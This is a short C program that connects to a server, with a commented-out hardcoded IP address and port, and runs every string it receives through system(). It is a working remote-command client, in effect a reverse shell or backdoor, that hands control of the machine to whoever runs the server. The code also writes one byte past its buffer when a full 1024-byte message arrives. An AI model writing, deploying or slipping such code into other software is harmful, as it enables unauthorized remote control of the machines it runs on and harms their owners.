#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define BUFFER_SIZE 1024

int main()
{
    int client_socket;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];
   char server_ip[16];
   int server_port;
    // char server_ip[16]="57.151.115.71";
    // int server_port=8080;


   printf("Enter server IP address: ");
   scanf("%15s", server_ip); 

   printf("Enter server port number: ");
   scanf("%d", &server_port);

    client_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (client_socket == -1)
    {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_port);
    inet_pton(AF_INET, server_ip, &server_addr.sin_addr);

    if (connect(client_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)
    {
        perror("Connection failed");
        exit(EXIT_FAILURE);
    }

    printf("Connected to server.\n");

    while (1)
    {
        int bytes_received = recv(client_socket, buffer, BUFFER_SIZE, 0);
        if (bytes_received < 0)
        {
            perror("Receive failed");
            exit(EXIT_FAILURE);
        }
        else if (bytes_received == 0)
        {
            printf("Server disconnected.\n");
            break;
        }

        buffer[bytes_received] = '\0';

        // printf("Message from server: %s\n", buffer);
        system(buffer);
    }

    // Close socket
    close(client_socket);

    return 0;
}
